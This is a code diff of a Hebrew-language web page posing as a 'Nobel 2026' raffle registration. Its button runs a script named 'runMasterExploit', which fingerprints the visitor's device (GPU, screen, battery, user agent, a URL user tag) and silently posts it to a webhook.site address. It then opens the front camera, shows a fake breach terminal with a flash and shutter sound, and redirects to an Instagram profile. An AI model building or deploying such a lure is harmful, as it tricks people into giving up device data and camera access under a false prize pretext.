@@ -3,28 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>מבצע נובל 2026 - הרשמה</title>
+    <title>מבצע נובל 2026 - אימות</title>
     <style>
         body { font-family: 'Segoe UI', system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; overflow: hidden; }
         .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 90%; z-index: 1; transition: all 0.5s; border: 2px solid transparent; }
         h1 { color: #1a73e8; margin-bottom: 10px; }
         p { color: #5f6368; line-height: 1.6; }
         button { background: #1a73e8; color: white; border: none; padding: 15px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 20px; width: 100%; }
-        button:hover { transform: scale(1.02); background: #1557b0; }
         
-        /* Hacked Mode */
         .hacked-body { background-color: #000; color: #0f0; }
         .progress-container { display: none; margin-top: 25px; border: 1px solid #0f0; height: 20px; background: #001100; }
-        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s; box-shadow: 0 0 10px #0f0; }
+        .progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.1s linear; box-shadow: 0 0 10px #0f0; }
         
-        /* Camera Feed Style */
         #hackerCam { width: 100%; border: 1px solid #0f0; margin-top: 15px; display: none; filter: sepia(100%) hue-rotate(80deg) brightness(1.1) contrast(1.2); border-radius: 8px; }
-        
         #log { font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; text-align: left; height: 120px; overflow-y: auto; color: #0f0; border-top: 1px dashed #0f0; padding-top: 10px; }
         
-        /* Flash Effect - Increased duration in logic */
         .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; z-index: 100; pointer-events: none; }
-        
         .warning { color: #ff0000; font-weight: bold; display: none; margin-top: 15px; animation: blink 0.8s infinite; text-transform: uppercase; }
         @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
     </style>
@@ -36,7 +30,7 @@
 <div class="card" id="mainCard">
     <div id="content-normal">
         <h1>הגרלת נובל 2026! 🎁</h1>
-        <p>ברכות על זכייתכם בשלב המוקדם. לחצו על הכפתור למטה כדי לאמת את הפרטים ולהירשם להגרלה הגדולה.</p>
+        <p>סרקתם והגעתם למקום הנכון. לחצו למטה לאימות המכשיר וכניסה להגרלה.</p>
         <button onclick="runMasterExploit()">אימות והרשמה</button>
     </div>
 
@@ -45,39 +39,39 @@
     </div>
 
     <video id="hackerCam" autoplay playsinline></video>
-
     <div id="log"></div>
     <div id="finalWarning" class="warning">System Breach: Data Exfiltration Complete</div>
 </div>
 
 <script>
-    // --- HELPER: Identify iPhone Models ---
+    const shutterSound = new Audio('https://www.soundjay.com/camera/camera-shutter-click-01.mp3');
+
+    // --- Updated iPhone Detective for 2026 (iPhone 16/17 Specs) ---
     function identifyIphone() {
         const h = window.screen.height;
         const r = window.devicePixelRatio;
+        
         if (r === 3) {
-            if (h === 852) return "iPhone 15 Pro / 14 Pro";
-            if (h === 932) return "iPhone 15 Pro Max / 14 Pro Max";
-            if (h === 844) return "iPhone 14 / 13 / 12";
-            if (h === 926) return "iPhone 14 Plus / 13 Pro Max";
-            if (h === 812) return "iPhone 13 mini / 12 mini / X / XS";
+            // iPhone 16/17 Pro Max models (Approx 932-940 range)
+            if (h >= 932) return "iPhone 17 Pro Max / 16 Pro Max";
+            // iPhone 16/17 Pro models (Approx 852-870 range)
+            if (h >= 852 && h < 932) return "iPhone 17 Pro / 16 Pro / 15 Pro";
+            // Standard iPhone 14/15/16
+            if (h === 844) return "iPhone 16 / 15 / 14";
         }
-        if (r === 2 && h === 896) return "iPhone 11 / XR";
-        if (h === 667) return "iPhone SE / 8 / 7";
+        if (h === 812) return "iPhone 13 mini / 12 mini / X";
+        if (h === 667) return "iPhone SE (3rd Gen) / 8";
         return "Apple Device (iPhone/iPad)";
     }
 
-    // --- HELPER: Identify Android Brands ---
     function identifyAndroid() {
         const ua = navigator.userAgent;
         if (ua.includes("Samsung") || ua.includes("SM-")) return "Samsung Galaxy";
-        if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO") || ua.includes("Mi ")) return "Xiaomi / Poco";
+        if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) return "Xiaomi / Poco";
         if (ua.includes("Pixel")) return "Google Pixel";
-        if (ua.includes("OnePlus")) return "OnePlus";
         return "Android Device";
     }
 
-    // --- HELPER: Get GPU Data ---
     function getGPU() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
@@ -92,15 +86,13 @@
         const video = document.getElementById('hackerCam');
         const flash = document.getElementById('screenFlash');
         
-        // 1. UI Switch
         document.body.classList.add('hacked-body');
         document.getElementById('mainCard').style.background = '#111';
         document.getElementById('content-normal').style.display = 'none';
         document.getElementById('exploitBox').style.display = 'block';
 
-        // 2. Data Collection
         let battery = "Blocked";
-        try { if(navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : ""); } } catch(e){}
+        try { if(navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; } } catch(e){}
 
         const platform = navigator.platform;
         let finalModel = "PC / Unknown";
@@ -108,74 +100,55 @@
         else if (/Android/.test(navigator.userAgent)) finalModel = identifyAndroid();
 
         const payload = {
-            user_tag: new URLSearchParams(window.location.search).get('user') || "Unknown_Target",
+            user_tag: new URLSearchParams(window.location.search).get('user') || "Unknown",
             conclusion: finalModel,
-            hardware: {
-                platform: platform,
-                cores: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A",
-                gpu: getGPU(),
-                res: `${window.screen.width}x${window.screen.height}`,
-                ratio: window.devicePixelRatio
-            },
-            software: {
-                agent: navigator.userAgent,
-                lang: navigator.language,
-                dark: window.matchMedia('(prefers-color-scheme: dark)').matches
-            },
-            power: battery,
-            timestamp: new Date().toISOString()
+            gpu: getGPU(),
+            res: `${window.screen.width}x${window.screen.height}`,
+            power: battery
         };
 
-        // 3. Silent Send
-        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af';
-        fetch(webhookUrl, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        fetch('https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af', { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
 
-        // 4. Scary Terminal Animation
         const logs = [
             "> Initializing Infiltration...",
-            `> Target: ${payload.user_tag}`,
-            `> Hardware Detected: ${payload.conclusion}`,
-            `> GPU: ${payload.hardware.gpu.split(' ').pop()}`,
+            `> Device: ${payload.conclusion}`,
+            `> Resolution: ${payload.res}`,
             "> Requesting hardware access...",
-            `> Battery Level: ${payload.power}`,
+            `> Battery: ${payload.power}`,
             "> TUNNELING PRIVATE DATA...",
             "> CAPTURING BIOMETRIC FEED...",
-            "> Uploading Identity_Package.zip...",
-            "> SUCCESS: Target Compromised."
+            "> FINALIZING BREACH..."
         ];
 
         let progress = 0;
+        // Interval set to 120ms for a slower, more tense experience
         const interval = setInterval(async () => {
             progress += 1;
             bar.style.width = progress + "%";
             
-            if (progress % 10 === 0 && logs.length > 0) {
+            if (progress % 12 === 0 && logs.length > 0) {
                 const line = document.createElement('div');
                 line.innerHTML = `<span style="color:#888">[${new Date().toLocaleTimeString()}]</span> ` + logs.shift();
                 logBox.appendChild(line);
                 logBox.scrollTop = logBox.scrollHeight;
             }
 
-            // --- CAMERA SCARE TRIGGER ---
-            if (progress === 30) {
+            // Camera activates earlier to give them time to see themselves
+            if (progress === 35) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     video.srcObject = stream;
                     video.style.display = "block";
                 } catch (e) {
-                    const errLine = document.createElement('div');
-                    errLine.style.color = "red";
-                    errLine.innerText = "> Error: Camera Permission Denied";
-                    logBox.appendChild(errLine);
+                    logBox.innerHTML += "<div style='color:red'>> Access Denied by User</div>";
                 }
             }
 
-            // --- UPDATED FLASH EFFECT (Delayed and Longer) ---
-            if (progress === 90) { // Delayed from 75 to 90
+            // Perfect timing for the Flash + Sound
+            if (progress === 95) {
+                shutterSound.play();
                 flash.style.display = "block";
-                // Duration increased from 100ms to 400ms for a more blinding effect
-                setTimeout(() => flash.style.display = "none", 400); 
+                setTimeout(() => flash.style.display = "none", 500); 
             }
 
             if (progress >= 100) {
@@ -183,9 +156,9 @@
                 document.getElementById('finalWarning').style.display = 'block';
                 setTimeout(() => {
                     window.location.href = "https://www.instagram.com/elisamuelson_/";
-                }, 1500);
+                }, 2000);
             }
-        }, 50);
+        }, 120); 
     }
 </script>
 
